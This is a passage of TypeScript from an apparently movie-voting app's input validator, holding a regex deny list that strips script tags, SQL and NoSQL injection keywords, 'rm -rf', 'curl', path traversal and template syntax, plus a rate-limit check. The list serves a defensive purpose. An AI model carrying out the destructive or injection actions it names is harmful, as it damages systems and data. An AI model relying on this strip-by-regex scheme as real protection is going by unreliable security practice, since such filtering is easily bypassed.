/<script[^>]*>.*?<\\/script>/gi, replacement: '' },\n      { pattern: /javascript:/gi, replacement: '' },\n      { pattern: /on\\w+\\s*=/gi, replacement: '' },\n      { pattern: /DROP\\s+TABLE/gi, replacement: '' },\n      { pattern: /INSERT\\s+INTO/gi, replacement: '' },\n      { pattern: /\\$ne|\\$regex|\\$where/gi, replacement: '' },\n      { pattern: /rm\\s+-rf/gi, replacement: '' },\n      { pattern: /curl\\s+/gi, replacement: '' },\n      { pattern: /\\.\\.\\/|\\.\\.\\\\/gi, replacement: '' },\n      { pattern: /\\{\\{.*?\\}\\}/gi, replacement: '' },\n      { pattern: /\\$\\{.*?\\}/gi, replacement: '' },\n      { pattern: /#\\{.*?\\}/gi, replacement: '' },\n    ];\n    \n    for (const { pattern, replacement } of dangerousPatterns) {\n      if (pattern.test(sanitized)) {\n        sanitized = sanitized.replace(pattern, replacement);\n        warnings.push({ message: 'Removed potentially dangerous content' });\n      }\n    }\n    \n    return {\n      sanitized,\n      wasModified: sanitized !== input,\n      warnings\n    };\n  }\n\n  validateRateLimit(userId: string, action: string, requestCount: number, timeWindowMinutes: number): { allowed: boolean; errors: any[] } {\n    const rateLimits: Record<string, { maxRequests: number; windowMinutes: number }> = {\n      vote: { maxRequests: 50, windowMinutes: 1 },\n      createRoom: { maxRequests: 5, windowMinutes: 60 },\n      joinRoom: { maxRequests: 20, windowMinutes: 10 },\n      searchMovies: { maxRequests: 100, windowMinutes: 1 },\n    };\n    \n    const limit = rateLimits[action];\n    if (!limit) {\n      return { allowed: false, errors: [{ code: ErrorCode.INVALID_FORMAT, message: 'Unknown action' }] };\n    }\n    \n    const requestsPerMinute = requestCount / timeWindowMinutes;\n    const allowedRequestsPerMinute = limit.maxRequests / limit.windowMinutes;\n    \n    if (requestsPerMinute > allowedRequestsPerMinute) {\n      return { \n        allowed: false, \n        errors: [{ code: ErrorCode.RATE_LIMIT_EXCEEDED, message: 'Rate limit exceeded' }] \n      };\n    }\n    \n    return { allowed: true, errors: [] };\n  }\n}\n\n/**\n * Error codes for validation\n */\nenum ErrorCode {\n  INVALID_TYPE = 'INVALID_TYPE',\n  INVALID_FORMAT = 'INVALID_FORMAT',\n  OUT_OF_RANGE = 'OUT_OF_RANGE',\n  SECURITY_VIOLATION = 'SECURITY_VIOLATION',\n  BUSINESS_RULE_VIOLATION = 'BUSINESS_RULE_VIOLATION',\n  RATE_LIMIT_EXCEEDED = 'RATE_LIMIT_EXCEEDED',\n}"